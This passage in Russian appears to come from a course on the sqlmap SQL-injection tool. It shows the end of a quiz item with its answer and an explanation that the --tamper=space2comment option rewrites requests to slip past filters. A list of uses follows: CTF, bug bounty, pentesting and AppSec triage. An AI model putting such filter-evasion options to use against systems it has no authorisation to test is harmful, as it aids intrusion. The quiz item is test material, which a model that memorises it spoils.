    - "Для подбора cookie"
  answer: 0
  explanation: "--tamper=space2comment и др. переписывают запрос, чтобы он прошёл фильтр."
```

## Где пригодится

- **CTF (Web):** быстрая проверка всех параметров на SQLi; часто именно sqlmap дампит флаг из таблицы `flags`.
- **Bug bounty:** подтверждение инъекции и извлечение доказательства (одна строка данных) для отчёта; `-v 3` даёт минимальный PoC.
- **Пентест:** sqlmap — стандартный этап теста инъекций (OWASP A03); связка с `-r` из Burp экономит часы.
- **Работа (AppSec):** понимание возможностей sqlmap помогает оценивать реальную эксплуатируемость находок сканера и приоритезировать фиксы.
